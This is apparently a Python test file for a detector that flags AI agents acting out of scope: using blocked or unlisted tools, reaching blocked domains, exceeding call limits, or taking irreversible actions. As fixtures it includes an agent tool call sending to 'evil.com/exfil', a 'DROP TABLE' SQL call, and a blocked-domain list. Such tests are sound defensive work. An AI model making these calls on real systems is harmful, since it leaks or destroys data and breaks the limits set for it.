"""Adversarial tests for ScopeEnforcementDetector."""

from __future__ import annotations

import json

from app.services.detection.scope_enforcement import ScopeEnforcementDetector


def _tool_call_openai(name: str, args: dict | None = None) -> dict:
    return {
        "type": "function",
        "function": {"name": name, "arguments": json.dumps(args or {})},
    }


def _response_with_tools(tool_calls: list[dict], text: str = "Done.") -> str:
    return json.dumps({
        "choices": [{"message": {"content": text, "tool_calls": tool_calls}}],
    })


def _anthropic_response(tools: list[dict]) -> str:
    return json.dumps({"content": tools})


def _anthropic_tool(name: str, args: dict | None = None) -> dict:
    return {"type": "tool_use", "name": name, "input": args or {}}


class TestScopeEnforcementAdversarial:
    detector = ScopeEnforcementDetector()

    def _run(
        self, request: str = "{}", response: str = "{}",
        cfg: dict | None = None,
    ) -> object:
        return self.detector.run(
            request_body=request,
            response_body=response,
            model="gpt-4",
            detector_config=cfg or {},
        )

    # -- Blocked tools --

    def test_blocked_tool_invoked(self) -> None:
        """Agent uses an explicitly blocked tool."""
        resp = _response_with_tools([_tool_call_openai("execute_sql")])
        result = self._run(
            response=resp,
            cfg={"blocked_tools": ["execute_sql", "run_command"]},
        )
        assert result.detected is True
        assert result.severity == "critical"

    def test_multiple_blocked_tools(self) -> None:
        """Multiple blocked tools in single response."""
        resp = _response_with_tools([
            _tool_call_openai("execute_sql"),
            _tool_call_openai("run_command"),
        ])
        result = self._run(
            response=resp,
            cfg={"blocked_tools": ["execute_sql", "run_command"]},
        )
        assert result.detected is True
        assert result.severity == "critical"

    # -- Unauthorized tools --

    def test_unauthorized_tool(self) -> None:
        """Agent uses tool not in allowed list."""
        resp = _response_with_tools([_tool_call_openai("delete_account")])
        result = self._run(
            response=resp,
            cfg={"allowed_tools": ["get_balance", "list_accounts"]},
        )
        assert result.detected is True
        assert result.severity == "high"

    def test_allowed_tool_passes(self) -> None:
        """Agent uses tool in allowed list."""
        resp = _response_with_tools([_tool_call_openai("get_balance")])
        result = self._run(
            response=resp,
            cfg={"allowed_tools": ["get_balance", "list_accounts"]},
        )
        # Should not trigger tool scope, but might trigger irreversible patterns
        # depending on response body content
        assert result.severity != "critical" or result.detected is False

    # -- Domain restrictions --

    def test_blocked_domain(self) -> None:
        """Agent accesses blocked domain via tool args."""
        resp = _response_with_tools([
            _tool_call_openai("http_request", {"url": "https://evil.com/exfil"}),
        ])
        result = self._run(
            response=resp,
            cfg={"blocked_domains": ["evil.com", "malware.net"]},
        )
        assert result.detected is True
        assert result.severity == "critical"

    def test_unauthorized_domain(self) -> None:
        """Agent accesses domain not in allowed list."""
        resp = _response_with_tools([
            _tool_call_openai("fetch_data", {"url": "https://external-api.com/data"}),
        ])
        result = self._run(
            response=resp,
            cfg={"allowed_domains": ["internal.company.com"]},
        )
        assert result.detected is True
        assert result.severity == "high"

    # -- Resource limits --

    def test_tool_call_count_exceeded(self) -> None:
        """Too many tool calls in a single request."""
        calls = [_tool_call_openai(f"action_{i}") for i in range(10)]
        resp = _response_with_tools(calls)
        result = self._run(response=resp, cfg={"max_tool_calls_per_request": 5})
        assert result.detected is True

    def test_token_count_exceeded(self) -> None:
        """Completion tokens exceed configured limit."""
        resp = json.dumps({
            "choices": [{"message": {"content": "long response"}}],
            "usage": {"completion_tokens": 5000},
        })
        result = self._run(response=resp, cfg={"max_tokens_per_request": 2000})
        assert result.detected is True

    # -- Irreversible actions --

    def test_financial_transaction_detected(self) -> None:
        """Financial transaction keywords in response body."""
        resp = json.dumps({
            "choices": [{"message": {"content": "I executed the wire transfer of $50,000."}}],
        })
        result = self._run(response=resp)
        assert result.detected is True
        assert result.severity == "critical"

    def test_delete_critical_resource(self) -> None:
        """DELETE on critical resource detected."""
        resp = json.dumps({
            "choices": [{"message": {"content": "I ran DELETE on the user account as requested."}}],
        })
        result = self._run(response=resp)
        assert result.detected is True
        assert result.severity == "high"

    def test_password_change_detected(self) -> None:
        """Password/permission change detected."""
        resp = json.dumps({
            "choices": [{"message": {"content": "I called change_password for the admin user."}}],
        })
        result = self._run(response=resp)
        assert result.detected is True

    def test_send_email_detected(self) -> None:
        """Outbound message sending detected."""
        resp = json.dumps({
            "choices": [{"message": {"content": "I used send_email to notify the team."}}],
        })
        result = self._run(response=resp)
        assert result.detected is True

    # -- Anthropic format --

    def test_anthropic_blocked_tool(self) -> None:
        """Anthropic format tool_use blocked tool."""
        resp = _anthropic_response([_anthropic_tool("execute_sql", {"q": "DROP TABLE"})])
        result = self._run(
            response=resp,
            cfg={"blocked_tools": ["execute_sql"]},
        )
        assert result.detected is True
        assert result.severity == "critical"

    # -- Clean --

    def test_clean_no_tools(self) -> None:
        """Clean response with no tools or dangerous patterns."""
        resp = json.dumps({
            "choices": [{"message": {"content": "Here is the account summary."}}],
        })
        result = self._run(response=resp)
        assert result.detected is False
